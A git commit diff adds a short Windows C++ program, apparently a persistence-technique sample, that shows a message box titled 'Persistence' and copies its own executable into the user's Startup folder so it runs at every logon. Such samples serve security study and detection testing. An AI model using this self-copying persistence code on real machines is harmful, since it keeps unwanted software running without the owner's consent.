f7741513dbe90f7efa543b4b0b4aaf5f47dc6c58
Hoàng Trang <168468366+aholicg@users.noreply.github.com>
2026-08-27 15:13:54 +0700

    Add files via upload

--- custom code/Startup Folder/startupfolder.cpp
+++ custom code/Startup Folder/startupfolder.cpp
@@ -1,1 +1,21 @@
+#include <windows.h>
+#include <stdio.h>
+#include <iostream>
+#include <string.h>
+#include <Shlobj.h>
 
+//no need of separate msgbox.exe anymore.
+int WINAPI WinMain(HINSTANCE hinstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
+	MessageBoxA(NULL, "Startup folder", "Persistence", MB_OK);
+
+	WCHAR szCurrentPath[MAX_PATH];
+	GetModuleFileNameW(NULL, szCurrentPath, MAX_PATH);
+
+	WCHAR szStartupPath[MAX_PATH];
+	SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, szStartupPath);
+
+	lstrcatW(szStartupPath, L"\\startupfolder.exe");
+	CopyFileW(szCurrentPath, szStartupPath, FALSE);
+
+	return 0;
+}
